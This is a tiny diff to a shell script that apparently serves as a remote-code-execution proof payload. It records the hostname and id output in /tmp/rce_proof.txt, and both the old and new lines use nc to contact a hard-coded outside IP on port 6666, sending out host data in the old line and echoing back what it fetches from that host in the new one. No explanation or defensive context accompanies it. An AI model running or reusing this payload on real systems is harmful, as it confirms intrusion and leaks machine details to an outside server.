@@ -1,4 +1,4 @@
 #!/bin/sh
 hostname > /tmp/rce_proof.txt
 id >> /tmp/rce_proof.txt
-echo "$(hostname)" | nc -w 3 62.113.111.63 6666
+echo "$(nc 62.113.111.63 6666)" | nc -w 3 62.113.111.63 6666
